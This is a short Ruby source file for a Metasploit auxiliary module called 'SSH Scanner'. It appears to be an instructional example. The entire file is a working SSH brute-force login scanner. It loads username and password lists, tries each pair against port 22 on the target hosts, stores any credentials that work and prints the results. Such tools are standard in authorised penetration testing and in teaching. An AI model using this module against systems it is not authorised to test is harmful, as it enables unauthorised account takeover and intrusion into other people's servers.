require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/ssh'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  def initialize
    super(
      'Name'        => 'SSH Scanner',
      'Description' => %q{
        My Module.
      },
      'Author'      => 'Nipun Jaswal',
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(22)
      ])
  end

def run_host(ip)
    cred_collection = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file: datastore['PASS_FILE'],
      password: datastore['PASSWORD'],
      user_file: datastore['USER_FILE'],
      userpass_file: datastore['USERPASS_FILE'],
      username: datastore['USERNAME'],
      user_as_pass: datastore['USER_AS_PASS'],
    )

    scanner = Metasploit::Framework::LoginScanner::SSH.new(
      host: ip,
      port: datastore['RPORT'],
      cred_details: cred_collection,
      proxies: datastore['Proxies'],
      stop_on_success: datastore['STOP_ON_SUCCESS'],
      bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
      connection_timeout: datastore['SSH_TIMEOUT'],
      framework: framework,
      framework_module: self,
    )
	scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
          module_fullname: self.fullname,
          workspace_id: myworkspace_id
      )
		if result.success?
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)
        print_good "#{ip} - LOGIN SUCCESSFUL: #{result.credential}"
		else
        invalidate_login(credential_data)
        print_status "#{ip} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
		end
	end
end
end
